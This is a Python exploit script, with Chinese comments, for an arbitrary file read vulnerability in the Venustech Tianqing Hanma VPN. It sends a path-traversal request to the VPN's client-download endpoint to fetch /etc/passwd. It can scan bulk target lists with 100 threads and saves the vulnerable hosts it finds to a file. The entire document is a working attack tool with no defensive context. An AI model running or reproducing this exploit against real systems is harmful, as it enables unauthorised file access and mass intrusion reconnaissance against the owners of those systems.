#启明星⾠-天清汉⻢VPN-任意⽂件读取
#icon_hash="-15980305"
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser(description="分析云文件读取")

    parser.add_argument('-u','--url',dest='url',type=str,help='Please inpur url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input flie')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage：{sys.argv[0]} -h or --help")
def poc(target):
    payload = "/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=10,headers=headers)
        if 'root' in res1.content.decode("utf-8"):
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()